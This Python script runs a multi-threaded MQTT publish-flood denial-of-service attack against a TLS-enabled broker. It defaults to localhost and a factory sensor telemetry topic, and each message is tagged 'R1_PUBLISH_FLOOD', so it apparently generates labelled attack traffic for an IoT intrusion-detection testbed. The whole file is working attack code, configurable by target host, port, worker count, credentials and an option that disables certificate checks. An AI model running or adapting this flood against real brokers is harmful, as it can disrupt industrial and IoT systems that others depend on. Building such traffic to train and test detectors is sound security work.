#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import json, time, threading, random, argparse, ssl, os
from datetime import datetime, timezone

class PublishFloodAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8883, ca_certs="certs/ca-cert.pem", insecure=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.ca_certs = ca_certs
        self.insecure = insecure
        self.attack_stats = {
            "messages_sent": 0, "messages_failed": 0, "connections_failed": 0,
            "start_time": None, "end_time": None
        }
        self.stop_event = threading.Event()

    def create_client(self, client_id, username=None, password=None):
        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
            # TLS CA Only
            if self.ca_certs and os.path.exists(self.ca_certs):
                client.tls_set(ca_certs=self.ca_certs, cert_reqs=ssl.CERT_REQUIRED, tls_version=ssl.PROTOCOL_TLS_CLIENT)
            elif self.insecure:
                client.tls_set(cert_reqs=ssl.CERT_NONE); client.tls_insecure_set(True)
            else:
                client.tls_set(cert_reqs=ssl.CERT_REQUIRED, tls_version=ssl.PROTOCOL_TLS_CLIENT)
            
            if self.insecure: client.tls_insecure_set(True)
            if username and password: client.username_pw_set(username, password)
            return client
        except Exception: return None

    def flood_worker(self, worker_id, num_messages, topics, delay_ms=0, username=None, password=None):
        client_id = f"Attack_flood_{worker_id}"
        client = self.create_client(client_id, username, password)
        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            print(f" Worker {worker_id}: Connected (TLS), starting flood...")
            
            for i in range(num_messages):
                if self.stop_event.is_set(): break
                try:
                    topic = random.choice(topics)
                    payload = {
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "packet_type": "PUBLISH",
                        "client_id": client_id,
                        "topic": topic,
                        "dupflag": 0, "qos": 0, "retain": False,
                        "payload_length": random.randint(100, 1000),
                        "src_ip": "127.0.0.1", "attack_signature": "R1_PUBLISH_FLOOD",
                        "worker_id": worker_id, "message_id": i,
                        "flood_data": "F" * random.randint(100, 1000)
                    }
                    info = client.publish(topic, json.dumps(payload), qos=0)
                    if getattr(info, "rc", 1) == 0: self.attack_stats["messages_sent"] += 1
                    else: self.attack_stats["messages_failed"] += 1
                    
                    if delay_ms > 0: time.sleep(delay_ms / 1000.0)
                except Exception: self.attack_stats["messages_failed"] += 1
        except Exception: self.attack_stats["connections_failed"] += 1
        finally:
            try: client.loop_stop(); client.disconnect()
            except: pass

    def launch_attack(self, num_workers=5, messages_per_worker=1000, topics=None, delay_ms=0, duration_seconds=None, username=None, password=None):
        topics = topics or ["factory/storage/storage-sensor_temp/telemetry"]
        print(f" Starting Flood (CA Hardcoded)")
        self.attack_stats["start_time"] = time.time()
        threads = []
        for i in range(num_workers):
            t = threading.Thread(target=self.flood_worker, args=(i, messages_per_worker, topics, delay_ms, username, password))
            threads.append(t); t.start()
        
        try:
            if duration_seconds:
                time.sleep(duration_seconds); self.stop_event.set()
            else:
                for t in threads: t.join()
        except KeyboardInterrupt: self.stop_event.set()
        
        self.attack_stats["end_time"] = time.time()
        print(f"Messages Sent: {self.attack_stats['messages_sent']}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--broker", default="localhost")
    parser.add_argument("--port", type=int, default=8883)
    parser.add_argument("--workers", type=int, default=5)
    parser.add_argument("--messages", type=int, default=1000)
    parser.add_argument("--delay", type=int, default=0)
    parser.add_argument("--duration", type=int)
    parser.add_argument("--topics", nargs="+")
    parser.add_argument("--username")
    parser.add_argument("--password")
    # Default CA Hardcoded
    parser.add_argument("--ca", default="certs/ca-cert.pem")
    parser.add_argument("--insecure", action="store_true")

    args = parser.parse_args()
    attack = PublishFloodAttackTLS(broker_host=args.broker, broker_port=args.port, ca_certs=args.ca, insecure=args.insecure)
    attack.launch_attack(num_workers=args.workers, messages_per_worker=args.messages, topics=args.topics, delay_ms=args.delay, duration_seconds=args.duration, username=args.username, password=args.password)

if __name__ == "__main__":
    main()
